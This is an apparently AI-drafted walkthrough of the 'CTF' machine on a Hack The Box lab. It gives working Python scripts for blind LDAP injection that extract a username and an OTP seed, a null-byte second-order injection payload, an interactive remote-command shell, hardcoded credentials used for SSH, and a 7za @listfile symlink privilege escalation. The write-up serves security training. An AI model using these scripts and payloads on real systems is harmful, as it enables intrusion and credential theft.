# HTB: CTF — Full Walkthrough

**Difficulty:** Insane | **OS:** Linux (CentOS 7) | **IP:** 10.129.228.35

---

## Table of Contents

1. [Mindset & Methodology Overview](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#mindset)
2. [Phase 1 — Reconnaissance](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase1)
3. [Phase 2 — Web Enumeration](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase2)
4. [Phase 3 — LDAP Injection: Username Enumeration](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase3)
5. [Phase 4 — LDAP Injection: Extracting the OTP Seed](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase4)
6. [Phase 5 — OTP Generation with stoken](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase5)
7. [Phase 6 — Second-Order LDAP Injection (Admin Bypass)](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase6)
8. [Phase 7 — Remote Code Execution via page.php](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase7)
9. [Phase 8 — Credential Extraction & SSH Shell](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase8)
10. [Phase 9 — Privilege Escalation via 7za @listfile Abuse](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#phase9)
11. [Lessons Learned & Key Techniques](https://claude.ai/chat/08bba291-92d4-43b7-a016-e58717bc331c#lessons)

---

## 1. Mindset & Methodology Overview <a name="mindset"></a>

Before touching the machine, the hacker mindset frames every action around one question: **"What does this system trust, and can I abuse that trust?"**

For CTF, the answer turned out to be: it trusts user-supplied input into an LDAP query without sanitising encoded characters, and it trusts filenames passed to 7-Zip without validating listfile references.

The overall methodology follows:

```
Recon → Enumerate → Find Injection Point → Exploit → Escalate
```

Every step is driven by evidence, not guessing. If a tool returns an interesting response, ask _why_ — the "why" is usually the vulnerability.

---

## 2. Phase 1 — Reconnaissance <a name="phase1"></a>

### Goal

Understand the attack surface. You cannot exploit what you don't know exists.

### Step 1: Full TCP Port Scan

```bash
nmap -sC -sV -p 22,80 10.129.228.35 -oN ctf_nmap.txt
```

**Why:** `-sC` runs default scripts (banner grabbing, http-title etc), `-sV` fingerprints service versions, `-oN` saves output for reference. We target 22 and 80 specifically after a fast full-range scan confirms only these two are open.

**Output:**

```
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 (CentOS) OpenSSL/1.0.2k PHP/5.4.16
```

### Hacker Mindset

- **Port 22 (SSH):** Noted for later. Requires credentials — come back when we have them.
- **Port 80 (HTTP):** Primary attack surface. PHP 5.4 is old and has known quirks (e.g. null byte handling in strings).
- **CentOS 7 + Apache 2.4.6:** Helps narrow OS-specific attack paths and confirms SELinux is likely enforced.

---

## 3. Phase 2 — Web Enumeration <a name="phase2"></a>

### Goal

Map the application's functionality and find hints about the backend technology.

### Step 2: Browse to the Site

Navigate to `http://10.129.228.35/`. The landing page warns explicitly:

> "Do not try to brute force"

**Hacker Mindset:** This is a signal, not just a warning. It tells you the developer anticipated automated tooling and added protections. Brute-force banning means any technique we use must be **precise and targeted**, not noisy.

### Step 3: View Page Source on /login.php

```bash
curl -s http://10.129.228.35/login.php | grep -i '<!--'
```

**Output (critical HTML comments):**

```html
<!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) -->
<!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) -->
```

**Why this matters:** These comments are developer notes accidentally left in production. They reveal:

1. The backend is **LDAP** (directory schema is mentioned)
2. An **existing LDAP attribute** stores an **81-digit token string**
3. The token is used for OTP authentication

**Hacker Mindset:** Developer comments are gold. They describe design decisions the developer thought were private. "81 digits stored in an existing attribute" immediately suggests the OTP seed is readable via LDAP injection if the input isn't sanitised.

### Step 4: Identify the Input Filter

Try submitting special LDAP characters directly into the username field:

```
* ( ) | & ! =
```

All of them silently fail — the form reloads with no error. But submitting their **URL-encoded equivalents** (e.g. `%2a` for `*`) returns `"Cannot login"`.

**Why this matters:** The server-side filter checks for raw special characters but not URL-encoded versions. After the filter check, PHP calls `urldecode()` on the value before using it in the LDAP query. This is the classic **input validation bypass via encoding**.

The server's PHP logic is effectively:

```php
if (!preg_match('/[()*&|!=><~]/', $username1)) {   // filter on raw input
    $username2 = urldecode($username1);              // then decode
    // use $username2 in LDAP query — INJECTION POINT
}
```

---

## 4. Phase 3 — LDAP Injection: Username Enumeration <a name="phase3"></a>

### Background: How LDAP Injection Works

LDAP queries use a filter syntax like:

```
(&(objectClass=inetOrgPerson)(uid=INPUT))
```

If `INPUT` is user-controlled and unsanitised, an attacker can close existing parentheses and add new conditions — exactly like SQL injection but with LDAP syntax.

Key LDAP operators:

|Symbol|Meaning|
|---|---|
|`*`|Wildcard|
|`()`|Group|
|`&`|AND|
|`\|`|OR|
|`!`|NOT|

### Step 5: Confirm LDAP Wildcard Works

```python
import requests, urllib.parse

resp = requests.post("http://10.129.228.35/login.php",
                     data={"inputUsername": "%2a", "inputOTP": "0000"})
print("Cannot login" in resp.text)   # True = wildcard matched a user
```

**Why `%2a`:** The `*` character is filtered raw, but `%2a` (URL-encoded `*`) passes the filter and gets decoded by `urldecode()` before reaching the LDAP query. The LDAP server then receives `*` and matches any user.

**Response: `"Cannot login"`** — confirms at least one user exists.

### Step 6: Enumerate the Username Character by Character

```python
import requests, urllib.parse

username = ""
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

while True:
    for c in chars:
        test = f"{username}{c}*"
        data = {"inputUsername": urllib.parse.quote(test), "inputOTP": "0000"}
        resp = requests.post("http://10.129.228.35/login.php", data=data)
        if "Cannot login" in resp.text:
            username += c
            print(f"\r[*] Found so far: {username}", end="", flush=True)
            break
    else:
        break

print(f"\n[+] Username: {username}")
```

**Why this works (Blind LDAP Injection):**

- We submit `a*` → LDAP checks if any user starts with `a` → `"not found"` = no, `"Cannot login"` = yes
- We repeat for each character position until no more characters match
- This is **blind injection** — we learn information based on behavioural differences, not direct data output

**Result:**

```
[+] Username: ldapuser
```

---

## 5. Phase 4 — LDAP Injection: Extracting the OTP Seed <a name="phase4"></a>

### Goal

The HTML comment told us the OTP seed is stored in an existing LDAP attribute. We know the username is `ldapuser`. Now extract the seed value.

### Step 7: Find Which Attribute Contains the Seed

We inject a condition to test if a given attribute exists and has a value:

```python
ldap_injection = "ldapuser))(&(pager=*"
# Results in LDAP query: (&(&(objectClass=inetOrgPerson)(uid=ldapuser))(&(pager=*))(pager=*))
```

Test various attributes (`pager`, `userPassword`, `mail`, etc.). The `pager` attribute returns `"Cannot login"`, confirming it exists and has a value.

**Why `pager`:** RSA SecurID token strings are 81 digits. The developer stored it in `pager` (a generic phone number field) rather than creating a custom attribute — consistent with the HTML comment "an already existing attribute."

### Step 8: Extract the 81-Digit Seed Character by Character

```python
import requests, urllib.parse

s = requests.session()
token = ""

while len(token) < 81:
    for c in "0123456789":
        test = token + c
        inj = f"ldapuser)(pager={test}*"
        data = {"inputUsername": urllib.parse.quote(inj), "inputOTP": "0000"}
        resp = s.post("http://10.129.228.35/login.php", data=data)
        if "Cannot login" in resp.text:
            token = test
            print(f"\r[{len(token)}/81] {token}", end="", flush=True)
            break
    else:
        print(f"\nStopped at position {len(token)}")
        break

print(f"\n[+] Seed: {token}")
```

**The LDAP query that runs for each test:**

```
(&(&(objectClass=inetOrgPerson)(uid=ldapuser)(pager=285*))  (pager=*))
```

If the pager value starts with `285`, LDAP returns a result → `"Cannot login"`. Otherwise `"not found"`.

**Result:**

```
[+] Seed: 285449490011372370317401734215712056720371131272577450204172154164546722716756524
```

**Critical Note:** This seed differed from older public writeups. The machine was reset and the LDAP directory re-initialised with a new token. **Always extract dynamically — never blindly trust writeup values.**

---

## 6. Phase 5 — OTP Generation with stoken <a name="phase5"></a>

### Background: RSA SecurID Tokens

The 81-digit seed is a **Compressed Token Format (CTF)** string used by RSA SecurID hardware/software tokens. The token generates a time-based 8-digit passcode every 60 seconds using a proprietary algorithm. The tool `stoken` implements this algorithm on Linux.

### Step 9: Install stoken

```bash
sudo apt install stoken -y
```

### Step 10: Generate OTP Correctly

The token is marked "expired" in stoken's metadata, so `--force` is needed. Crucially, the server's clock must be used as the time reference, and `calendar.timegm()` must convert the UTC Date header correctly (not `time.mktime()` which applies local timezone offset):

```python
import requests, time, calendar
from subprocess import Popen, PIPE

seed = "285449490011372370317401734215712056720371131272577450204172154164546722716756524"

r = requests.get("http://10.129.228.35/login.php")
server_utc = time.strptime(r.headers['Date'], "%a, %d %b %Y %H:%M:%S %Z")
server_time = calendar.timegm(server_utc)  # UTC-aware conversion

p = Popen(['stoken', f'--token={seed}', f'--use-time={server_time}',
           '--pin=0000', '--force'], stdout=PIPE)
otp = p.communicate()[0].decode().strip()
print(f"OTP: {otp}")
```

**Why `calendar.timegm` not `time.mktime`:**

- `time.mktime()` treats input as **local time** → if Kali is in UTC+X, timestamp is off by hours → wrong OTP every time
- `calendar.timegm()` treats input as **UTC** → correct absolute Unix timestamp → correct OTP

**Why `--use-time` with absolute timestamp:**

- `--use-time` takes a Unix epoch value, not a delta
- Using the server's actual current time ensures our OTP matches what the server calculates

---

## 7. Phase 6 — Second-Order LDAP Injection (Admin Bypass) <a name="phase6"></a>

### Background: What is Second-Order Injection?

In second-order injection, malicious input is stored during one operation and executed in a different operation. Here:

1. **Login (first operation):** The injected username is stored in the PHP session
2. **page.php (second operation):** The stored username is retrieved from session and used in a _different_ LDAP query — one that checks group membership

### The Two LDAP Queries

**Login query** (just authenticates):

```
(&(&(objectClass=inetOrgPerson)(uid=INPUT))(pager=*))
```

**Admin check query** on page.php (checks group):

```
(&(&(objectClass=inetOrgPerson)(uid=INPUT)(|(gidNumber=4)(gidNumber=0)))(pager=*))
```

`gidNumber=0` is root, `gidNumber=4` is adm. `ldapuser` has `gidNumber=1000` — so this check always fails for normal users.

### Step 11: Inject Null Byte to Truncate the Admin Query

Payload: `ldapuser%29%29%29%00`  
Decoded: `ldapuser)))` + null byte (`\x00`)

When stored in session and used in the admin check query:

```
(&(&(objectClass=inetOrgPerson)(uid=ldapuser)))\x00)(|(gidNumber=4)(gidNumber=0)))(pager=*))
```

PHP/LDAP truncates the string at the null byte, leaving:

```
(&(&(objectClass=inetOrgPerson)(uid=ldapuser)))
```

The `gidNumber` check is **completely removed** from the query. The LDAP server returns `ldapuser` as a valid result, and page.php grants command execution.

**Why three closing parens `)))`:**

- `)` closes `(uid=ldapuser`
- `)` closes `(&(objectClass=...)(uid=ldapuser)`
- `)` closes the outer `(&...)`

This produces a syntactically valid LDAP filter that matches ldapuser, bypassing the group restriction.

### Step 12: Build the Shell Script

```python
#!/usr/bin/env python3
import re, requests, time, calendar
from cmd import Cmd
from subprocess import Popen, PIPE

class CTF_TERM(Cmd):
    prompt = "CTF> "

    def __init__(self):
        super().__init__()
        self.seed = '285449490011372370317401734215712056720371131272577450204172154164546722716756524'
        self.s = requests.session()
        self.target = 'http://10.129.228.35'
        otp = self.get_otp()
        resp = self.s.post(f'{self.target}/login.php',
                data={"inputUsername": "ldapuser%29%29%29%00", "inputOTP": otp})
        print("[+] Logged in!" if "Logout" in resp.text else "[-] Login failed")

    def get_otp(self):
        r = self.s.get(f'{self.target}/login.php')
        t = calendar.timegm(time.strptime(r.headers['Date'], "%a, %d %b %Y %H:%M:%S %Z"))
        p = Popen(['stoken', f'--token={self.seed}', f'--use-time={t}',
                   '--pin=0000', '--force'], stdout=PIPE)
        return p.communicate()[0].decode().strip()

    def default(self, cmd):
        resp = self.s.post(f'{self.target}/page.php',
                data={"inputCmd": cmd, "inputOTP": self.get_otp()})
        result = re.findall(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
        print(result[0].rstrip() if result else "[-] No output")

term = CTF_TERM()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()
```

**Why a Python `cmd.Cmd` shell?**  
Each command on page.php requires a fresh OTP. The `cmd.Cmd` class gives us an interactive REPL that automatically calls `get_otp()` (which re-fetches server time) for every command, eliminating timing issues.

---

## 8. Phase 7 — Remote Code Execution via page.php <a name="phase7"></a>

### Step 13: Verify RCE

```
CTF> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

We have code execution as the `apache` user. SELinux context `httpd_t` means:

- We **cannot** write to `/tmp` (SELinux blocks `fifo_file` creation there)
- We **cannot** get a reverse shell via `mkfifo /tmp/f` — SELinux blocks it
- We **can** read files apache has read access to

**Hacker Mindset:** SELinux prevents the obvious reverse shell. Rather than fighting it, use the web interface itself as the command channel — which is exactly what our Python shell does. Work within constraints intelligently.

---

## 9. Phase 8 — Credential Extraction & SSH Shell <a name="phase8"></a>

### Step 14: Read login.php for Hardcoded Credentials

```
CTF> cat /var/www/html/login.php
```

**Key section of output:**

```php
$username = 'ldapuser';
$password = 'e398e27d5c4ad45086fe431120932a01';
```

**Why credentials are here:** The PHP code needs to bind to the LDAP server to run queries. That bind requires credentials. Developers frequently hardcode service account credentials in PHP source — a common finding in real-world web app assessments.

**Hacker Mindset:** Always read every PHP file you can access after getting RCE. Config files, includes, and connection files routinely contain credentials, API keys, or database passwords.

### Step 15: SSH as ldapuser

```bash
ssh ldapuser@10.129.228.35
# Password: e398e27d5c4ad45086fe431120932a01
```

### Step 16: Grab user.txt

```bash
cat ~/user.txt
# b53676[redacted]71c2777a709
```

**Why SSH over web shell:** SSH gives a proper TTY, persistent session, tab completion, and no SELinux httpd_t restrictions. Always upgrade to SSH when credentials are available.

---

## 10. Phase 9 — Privilege Escalation via 7za @listfile Abuse <a name="phase9"></a>

### Step 17: Enumerate the System

```bash
ls -la /
```

Output includes:

```
drwxr-xr-x.  2 root root 4096 /backup
```

```bash
ls -la /backup/
cat /backup/honeypot.sh
```

### Understanding honeypot.sh

The script runs every minute via cron as root:

```bash
# 1. Updates banned IPs list
/usr/sbin/ipset list | grep fail2ban ... > /var/www/html/banned.txt

# 2. Generates a backup password from root.txt hash
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# 3. Archives everything in /var/www/html/uploads with 7za
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# 4. Deletes all files in uploads
rm -rf -- *

# 5. Clears error log
truncate -s 0 /backup/error.log
```

### The Vulnerability: 7za @listfile Feature

When 7za processes the glob `*`, the shell expands it to all filenames in the directory. If a filename starts with `@`, 7za treats it as a **listfile** — a text file whose contents are a list of additional filenames to archive.

So if we create a file named `@list`, 7za will open the file named `list` and try to archive every filename written inside it.

If `list` is a **symlink to `/root/root.txt`**, 7za opens `/root/root.txt` (as root) and reads its contents as a list of filenames to archive. The flag value (e.g. `7c7ca16fb0b3a26ea4800b5610570784`) is not a valid filename, so 7za emits a warning — and that warning gets logged to error.log via the cron job's stderr redirection.

**Why `--` doesn't protect against this:**  
The `--` flag in 7za stops _switch parsing_ (so `-r` can't be injected as a switch). But `@listfile` references are not switches — they are part of the filename/argument processing that happens after `--`. The developer protected against wildcard switch injection but missed the listfile vector.

### Step 18: Set Up the Trap

First, confirm the uploads directory is writable (it was already 777, accessible to ldapuser):

```bash
ls -la /var/www/html/uploads/
# drwxrwxrwx. 2 apache apache
```

Create the trap files:

```bash
cd /var/www/html/uploads

# The @ prefix tells 7za "treat the following filename as a listfile"
touch @list

# The listfile 'list' points to root's flag
ln -s /root/root.txt list

ls -la
# -rw-rw-r--. 1 ldapuser ldapuser  0 @list
# lrwxrwxrwx. 1 ldapuser ldapuser 14 list -> /root/root.txt
```

**Why an empty `@list`?**  
The `@list` file just needs to exist so the shell glob `*` expands to include it. It doesn't need any content — `@list` itself is just the trigger. `list` is the actual listfile that 7za reads.

**Why a symlink for `list`?**  
7za follows symlinks when reading listfiles (even with `-snl`, which only controls how symlinks are _archived_, not how listfiles are _read_). So `list` → `/root/root.txt` causes 7za to read the flag as if it were a list of filenames.

### Step 19: Race to Capture error.log

The window is small: honeypot.sh writes errors to error.log, then immediately truncates it. We busy-loop to catch it, and also re-create the trap files if the cron wipes them before we catch the output:

```bash
while true; do
    if [ -s /backup/error.log ]; then
        cat /backup/error.log
        break
    fi
    [ ! -f @list ] && touch @list
    [ ! -L list ]  && ln -s /root/root.txt list
    sleep 0.1
done
```

### Step 20: Root Flag Captured

```
WARNING: No more files
7c7ca1[redacted]610570784
```

The `"WARNING: No more files"` message is 7za complaining that the flag value it read from the listfile is not a real file it can archive. Root's flag is leaked as a side-effect of that error.

---

## 11. Lessons Learned & Key Techniques <a name="lessons"></a>

### Vulnerability Summary

|#|Vulnerability|Location|Impact|
|---|---|---|---|
|1|Blind LDAP Injection (Username Enum)|login.php|Username disclosure|
|2|Blind LDAP Injection (Attribute Exfil)|login.php|OTP seed disclosure|
|3|Second-Order LDAP Injection + Null Byte|login.php → page.php|Admin group bypass → RCE|
|4|Hardcoded Credentials|login.php|SSH access as ldapuser|
|5|7za @listfile via Wildcard Expansion|honeypot.sh (cron)|Root flag disclosure|

### Key Lessons

**1. Always re-enumerate dynamically**  
The token seed from every public writeup was wrong. The machine had been reset. Trusting static writeup values cost significant time. Always extract live data — especially secrets.

**2. Encoding is a filter bypass technique, not just formatting**  
The server filtered `*()&` raw but not URL-encoded. Understanding that `urldecode()` runs _after_ the filter is the key insight. In real engagements, test both raw and encoded forms of injection payloads.

**3. Second-order injection is about context switching**  
The injection bypassed the login check but still failed on page.php — because page.php ran a _different_ LDAP query against the same stored username. Recognise that stored user-controlled data can be re-injected in a different context.

**4. Null bytes still work in PHP 5.4 LDAP**  
Modern PHP (7+) sanitises null bytes in many contexts. PHP 5.4 does not. Version fingerprinting during recon directly informs which techniques are viable.

**5. Developer comments are security findings**  
The HTML comment revealing "81-digit token in existing attribute" told us exactly what to look for in the LDAP injection. In real assessments, document every comment, error message, and debug artifact.

**6. Know your tools deeply**  
`stoken --use-time` takes an absolute Unix timestamp. `time.mktime()` is timezone-aware. `calendar.timegm()` is not. A 5-hour timezone offset silently broke OTP generation. Reading manpages and understanding edge cases separates a stuck assessment from a completed one.

**7. SELinux changes _how_ you exploit, not _whether_ you can**  
Standard reverse shells were blocked by SELinux's httpd_t context. Instead of fighting SELinux directly, we used the web application as the command channel — which is always permitted because it's what httpd_t is designed to allow.

**8. Wildcard expansion is a systemic risk in cron jobs**  
`7za ... -- *` combined with `@listfile` support creates a privilege escalation path whenever a low-privileged user can write to the globbed directory. The `--` only blocks switch injection. Always audit cron scripts that use `*` with feature-rich tools.

---

_Rooted. Total flags: user.txt ✓ root.txt ✓_
